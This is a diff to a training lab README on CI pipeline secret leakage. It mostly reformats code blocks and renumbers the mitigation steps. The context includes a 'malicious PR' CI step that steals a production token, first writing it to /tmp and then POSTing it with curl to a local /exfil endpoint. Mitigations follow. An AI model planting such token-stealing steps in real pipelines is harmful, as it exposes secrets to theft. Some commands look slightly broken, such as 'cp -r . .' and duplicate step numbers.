@@ -32,10 +32,10 @@ All exploitation and detection occurs locally: exfiltration is to a **local** li
 
 ---
 
-## Repository layout (what you will create)
+## Repository layout (what you will have)
 
 ```
-insecure_pipeline_exploitation/
+lab3-2/
 ├─ README.md
 ├─ secrets/
 │  └─ prod_token.txt        # intentionally committed "secret"
@@ -276,6 +276,9 @@ How to run and test?
 
 ```bash
 chmod +x setup_lab.sh
+```
+
+```bash
 ./setup_lab.sh
 ```
 
@@ -304,14 +307,29 @@ bash -x .ci/run-ci.sh
 
 ```bash
 git checkout -b malicious-pr
+```
+
+```bash
 cat > .ci/actions/third_party_step.sh <<'SH'
 #!/usr/bin/env bash
 echo "$PROD_API_TOKEN" > /tmp/stolen_token.txt
 echo "Wrote token to /tmp/stolen_token.txt"
 SH
+```
+
+```bash
 chmod +x .ci/actions/third_party_step.sh
+```
+
+```bash
 git add .ci/actions/third_party_step.sh
+```
+
+```bash
 git commit -m "malicious: write token locally"
+```
+
+```bash
 ./.ci/run-ci.sh
 ```
 
@@ -359,14 +377,29 @@ PY
 
 ```bash
 git checkout malicious-pr
+```
+
+```bash
 cat > .ci/actions/third_party_step.sh <<'SH'
 #!/usr/bin/env bash
 curl -s -X POST http://127.0.0.1:8000/exfil -d "token=$PROD_API_TOKEN"
 echo "Posted token to localhost:8000"
 SH
+```
+
+```bash
 chmod +x .ci/actions/third_party_step.sh
+```
+
+```bash
 git add .ci/actions/third_party_step.sh
+```
+
+```bash
 git commit -m "malicious: post token to localhost"
+```
+
+```bash
 ./.ci/run-ci.sh
 ```
 
@@ -416,12 +449,15 @@ You should apply at least these mitigations and verify the leak is closed:
 
    ```bash
    git rm secrets/prod_token.txt
+   ```
+
+   ```bash
    git commit -m "remove secret from repo"
    ```
 
    (Discuss git history and `git filter-repo` / `bfg` for real cases.)
 
-2. **Stop injecting secrets into logs / avoid printing**
+1. **Stop injecting secrets into logs / avoid printing**
 
    * Update `.ci/jobs/build.sh` and `.ci/actions/*` to **never** echo the token. Instead log a redacted placeholder.
 
@@ -430,7 +466,7 @@ You should apply at least these mitigations and verify the leak is closed:
    echo "Using token: [REDACTED]"
    ```
 
-3. **Treat actions from untrusted sources as untrusted**
+2. **Treat actions from untrusted sources as untrusted**
 
    * Simulate CI behavior that **disallows** using `.ci/actions` content from untrusted PRs: in `run-ci.sh`, if `GIT_BRANCH` looks like `malicious-pr`, refuse running third\_party\_step.sh (simulate job gating). Implement a check:
 
@@ -442,12 +478,15 @@ You should apply at least these mitigations and verify the leak is closed:
    fi
    ```
 
-4. **Make runner ephemeral**
+3. **Make runner ephemeral**
 
    * Change `run-ci.sh` to create workspace in a temp dir and destroy it after the job to avoid persistence:
 
    ```bash
    TMPROOT=$(mktemp -d)
+   ```
+
+   ```bash
    cp -r . .
    ```
 
@@ -471,6 +510,9 @@ You should apply at least these mitigations and verify the leak is closed:
    fi
    exit 0
    SH
+   ```
+
+   ```bash
    chmod +x .git/hooks/pre-commit
    ```
 
